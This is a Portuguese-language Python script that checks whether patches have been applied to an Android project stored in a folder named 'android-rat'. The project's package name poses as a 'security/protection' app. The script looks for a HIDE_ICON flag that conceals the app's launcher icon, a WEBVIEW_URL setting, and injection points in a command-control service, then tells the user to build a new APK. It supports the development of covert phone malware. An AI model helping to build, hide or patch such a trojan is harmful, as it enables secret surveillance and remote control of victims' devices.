"""
testar_patch.py  —  Roda na VPS para confirmar que os patches funcionam
Execute: python testar_patch.py
"""
import re
from pathlib import Path

def find_java_dir():
    candidates = [
        Path("C:/Users/Administrador/Desktop/OOOP/finalvnc/finalvnc/android-rat"),
        Path("C:/Users/Administrator/Desktop/OOOP/finalvnc/finalvnc/android-rat"),
        Path(__file__).resolve().parent / "finalvnc/finalvnc/android-rat",
        Path(__file__).resolve().parent.parent / "finalvnc/finalvnc/android-rat",
    ]
    for c in candidates:
        j = c / "app/src/main/java/com/seguranca/protecao"
        if j.exists():
            return j
    return None

java_dir = find_java_dir()
if not java_dir:
    print("[ERRO] Pasta java nao encontrada")
    exit(1)

print(f"[OK] Java dir: {java_dir}\n")
print("=" * 60)

# ── Checa CommandControlService ──────────────────────────────
ccs = java_dir / "CommandControlService.java"
ccs_txt = ccs.read_text(encoding="utf-8", errors="replace")

print("CommandControlService.java:")
if "HIDE_ICON" in ccs_txt:
    m = re.search(r'public static final boolean HIDE_ICON\s*=\s*(true|false)', ccs_txt)
    val = m.group(1) if m else "?"
    print(f"  [OK] HIDE_ICON = {val}")
else:
    print("  [MISS] HIDE_ICON nao encontrado")
    # Mostra ponto de injecao
    if "WEBVIEW_URL" in ccs_txt:
        print("  [OK] WEBVIEW_URL existe — patch vai injetar HIDE_ICON apos ela")
    else:
        print("  [ERRO] WEBVIEW_URL tambem nao existe!")

m2 = re.search(r'public static final String WEBVIEW_URL\s*=\s*"([^"]*)"', ccs_txt)
print(f"  WEBVIEW_URL = \"{m2.group(1) if m2 else 'NAO ENCONTRADO'}\"")

print()

# ── Checa SetupWizardActivity ────────────────────────────────
swa = java_dir / "SetupWizardActivity.java"
swa_txt = swa.read_text(encoding="utf-8", errors="replace")

print("SetupWizardActivity.java:")
if "HIDE_ICON" in swa_txt:
    print("  [OK] HIDE_ICON ja presente — ocultar vai funcionar")
else:
    print("  [MISS] HIDE_ICON nao presente")
    # Verifica ponto de injecao
    if re.search(r'startService\(ccIntent\)', swa_txt):
        print("  [OK] startService(ccIntent) encontrado — patch pode injetar aqui")
    else:
        print("  [ERRO] startService(ccIntent) nao encontrado — patch nao vai conseguir injetar!")
        # Procura algo parecido
        matches = re.findall(r'startService\([^\)]+\)', swa_txt)
        print(f"  Encontrei startService com: {matches}")

if "WEBVIEW_URL" in swa_txt:
    print("  [OK] WEBVIEW_URL check presente — WebView abre apos setup")
else:
    print("  [MISS] WEBVIEW_URL check nao presente — WebView NAO vai abrir!")

print()

# ── Checa MainActivity ───────────────────────────────────────
main = java_dir / "MainActivity.java"
main_txt = main.read_text(encoding="utf-8", errors="replace")

print("MainActivity.java:")
if "HIDE_ICON" in main_txt:
    print("  [OK] HIDE_ICON ja presente")
else:
    print("  [INFO] HIDE_ICON nao presente — patch vai injetar")
if re.search(r'startBackgroundServices\(\)', main_txt):
    print("  [OK] startBackgroundServices encontrado — ponto de injecao valido")
else:
    print("  [WARN] startBackgroundServices nao encontrado")

print()
print("=" * 60)
print("Resumo:")
todos_ok = (
    "HIDE_ICON" in ccs_txt and
    "WEBVIEW_URL" in swa_txt and
    re.search(r'startService\(ccIntent\)', swa_txt)
)
if todos_ok:
    print("  TUDO OK — gere um APK novo que vai funcionar!")
else:
    print("  TEM PROBLEMAS — veja os itens [MISS] e [ERRO] acima")
